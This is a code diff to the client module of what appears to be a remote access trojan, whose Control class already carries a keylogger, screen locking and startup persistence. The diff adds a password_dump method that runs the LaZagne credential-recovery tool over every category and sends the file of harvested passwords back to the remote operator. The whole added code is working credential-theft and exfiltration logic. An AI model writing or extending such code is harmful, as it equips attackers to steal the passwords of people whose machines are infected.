@@ -9,10 +9,13 @@ import abc
 import os
 import subprocess
 import sys
+import logging
+import tempfile
 from io import BytesIO, StringIO
 
 from src import helper, errors
 from src.definitions import platforms
+from src.logger import LOGGER_ID
 
 if platforms.OS == platforms.LINUX:
     import Xlib
@@ -26,6 +29,10 @@ else:
 
 from src.definitions.commands import *
 from src.client.keylogger import Keylogger
+
+from lazagne.config.write_output import write_in_file, StandardOutput
+from lazagne.config.constant import constant
+from lazagne.config.run import run_lazagne
 
 
 # abstract methods are the ones not cross compatible
@@ -52,6 +59,54 @@ class Control(metaclass=abc.ABCMeta):
     @abc.abstractmethod
     def lock(self):
         pass
+
+    # laZagne password dump
+    def password_dump(self, password=None):
+        with tempfile.TemporaryDirectory() as tmp:
+            constant.st = StandardOutput()
+
+            out = StringIO()
+
+            constant.output = 'txt'
+            constant.folder_name = tmp
+
+            level = logging.getLogger(LOGGER_ID).level
+
+            if level == logging.DEBUG:
+                constant.quiet_mode = False
+            else:
+                constant.quiet_mode = True
+
+            formatter = logging.Formatter(fmt='%(message)s')
+            stream = logging.StreamHandler(out)
+            stream.setFormatter(formatter)
+            root = logging.getLogger(__name__)
+            root.setLevel(level)
+
+            for r in root.handlers:
+                r.setLevel(logging.CRITICAL)
+            root.addHandler(stream)
+
+            constant.st.first_title()
+
+            if platforms.OS in [platforms.WINDOWS, platforms.DARWIN]:
+                constant.user_password = password
+
+                for _ in run_lazagne(category_selected="all", subcategories={password: password}, password=password):
+                    pass
+            else:
+                for _ in run_lazagne(category_selected="all", subcategories={}):
+                    pass
+
+            write_in_file(constant.stdout_result)
+
+            # find file in the tmp dir and send it
+            for it in os.scandir(tmp):
+                if not it.is_dir() and it.path.endswith(".txt"):
+                    self.receive(it.path)
+                    return
+
+            self.es.send_json(ERROR, "Error getting results file.")
 
     def add_startup(self, remove=False):
         p = Persistence()
